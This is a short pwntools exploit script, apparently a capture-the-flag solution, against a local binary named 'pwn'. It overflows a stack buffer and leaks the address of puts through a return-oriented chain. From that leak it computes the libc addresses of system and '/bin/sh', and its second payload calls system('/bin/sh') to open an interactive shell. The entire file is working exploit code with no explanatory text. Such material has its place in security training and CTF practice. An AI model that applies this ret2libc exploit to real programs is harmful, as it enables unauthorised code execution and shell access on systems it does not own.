from pwn import *
p = process("./pwn")
puts_plt = 0x4004a0
puts_got = 0x601018
main_addr = 0x4005ee
rdi_addr = 0x4006c3
payload0 = b"ssss"
p.sendline(payload0)
p.recvuntil(b"Hello sir: ssss")
payload1 = b"a"*88 + p64(rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.sendline(payload1)
p.recvuntil(b"May be you can try again!\n")
puts_addr = u64(p.recvline()[:-1].ljust(8, b'\x00'))
print(f"Address: {hex(puts_addr)}")
payload = b"ssss"
p.sendline(payload)
p.recvuntil(b"Hello sir: ssss")
#gdb.attach(p)
#p.sendline(cyclic(200))
ret_addr = 0x400656
libc_addr = puts_addr - 0x87be0
system_addr = libc_addr + 0x58750
binsh_addr = libc_addr + 0x1cb42f
payload2 = b"a"*88 + p64(ret_addr) + p64(rdi_addr) + p64(binsh_addr)  + p64(system_addr)
p.sendline(payload2)
p.interactive()
